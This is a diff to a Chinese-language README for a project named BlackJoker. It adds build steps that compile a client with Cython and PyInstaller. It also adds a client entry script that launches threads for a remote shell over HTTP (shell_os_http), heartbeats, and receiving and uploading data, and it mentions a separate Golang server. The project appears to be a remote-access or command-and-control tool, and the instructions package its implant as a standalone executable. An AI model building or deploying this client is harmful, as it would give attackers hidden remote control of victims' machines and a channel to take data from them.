@@ -17,13 +17,34 @@
 ```
 pyinstaller -F -add-data "R-Cadimn.jpg" main.py
 ```
-开发者推荐的客户端编译代码
+开发者推荐的客户端编译代码:
 
 ```
-python BlackJoker/Client/ClientPyd/Cython编译环境/setup.py build_ext --inplace
+python BlackJoker/Client/ClientPyd/Cython编译目录/setup.py build_ext --inplace
 
-BlackJoker/Client/ClientPyd/Cython编译环境/main.py:
+```
+BlackJoker/Client/ClientPyd/Cython编译目录/blackjoker.py:
+```
+import BlackJokerpyx # type: ignore
+import threading
 
+if __name__ == "__main__":
+    if BlackJokerpyx.init_server():
+        # 启动线程
+        threads = [
+            threading.Thread(target=BlackJokerpyx.shell_os_http),
+            threading.Thread(target=BlackJokerpyx.heartbeat_http),
+            threading.Thread(target=BlackJokerpyx.heartbeat_receive_and_upload)
+        ]
+        for thread in threads:
+            thread.start()
+        for thread in threads:
+            thread.join()
+
+```
+
+```
+pyinstaller -F blackjoker.py -add-data "{python BlackJoker/Client/ClientPyd/Cython编译目录/setup.py build_ext --inplace得到的pyd文件路径}"
 ```
 
 4.需要自定义编译服务端需要Golang环境
